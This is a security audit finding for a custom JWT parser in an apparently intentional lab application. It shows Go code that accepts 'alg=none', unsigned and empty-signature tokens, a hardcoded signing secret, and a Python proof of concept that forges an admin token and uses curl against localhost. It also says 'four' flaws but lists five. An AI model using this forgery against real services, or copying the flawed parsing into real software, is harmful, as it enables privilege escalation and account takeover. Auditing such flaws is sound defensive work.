# C7 — JWT Validation Flaws (V20)

**Severity:** Critical  
**CWE:** CWE-347 | **OWASP:** A07:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-020-v20-jwt-flaws.md`

## Summary

The custom JWT implementation in `handlers/advanced_lab.go` has four independent flaws, each a complete bypass:

1. **`alg=none` accepted.**
2. **Two-part tokens (no signature) accepted.**
3. **Empty-signature tokens accepted.**
4. **`exp` / `iss` / `aud` never validated.**
5. **Hardcoded weak signing secret** `kitchen-legacy-secret` (also in source).

## Vulnerable Code

`handlers/advanced_lab.go::parseLabJWT`:

```go
alg, _ := header["alg"].(string)
if strings.EqualFold(alg, "none") || len(parts) == 2 || parts[2] == "" {
    return claims, header, nil  // <-- three bypass paths in one OR
}
// only reach signature check if all of the above fail
```

```go
const legacyKitchenJWTSecret = "kitchen-legacy-secret"
```

## Impact

- Any attacker who reads the source (or runs `strings` on the binary) can forge `role: admin` tokens.
- Privilege escalation to staff panel, kitchen inventory adjust (V16), and read access to inventory data.
- Expired tokens remain valid forever.

## PoC (alg=none)

**Token construction (Python):**
```python
import base64, json
def b64(x): return base64.urlsafe_b64encode(json.dumps(x, separators=(',',':')).encode()).rstrip(b'=').decode()
header = {"alg":"none","typ":"JWT"}
payload = {"sub":999,"email":"h@evil.com","role":"admin","iss":"kitchen-display-service","iat":1713000000,"exp":9999999999}
token = b64(header) + "." + b64(payload) + "."
```

**Request:**
```bash
curl http://localhost:4443/api/staff/panel -H "Authorization: Bearer <token>"
```

Response (200 OK):
```json
{
  "message": "kitchen control panel loaded",
  "auth": {"alg":"none","role":"admin","email":"h@evil.com"},
  "inventory": [...]
}
```

## Cold Verification

Re-read source: confirmed all five flaws. The single `if` statement contains three independent OR conditions each of which is itself a vulnerability.
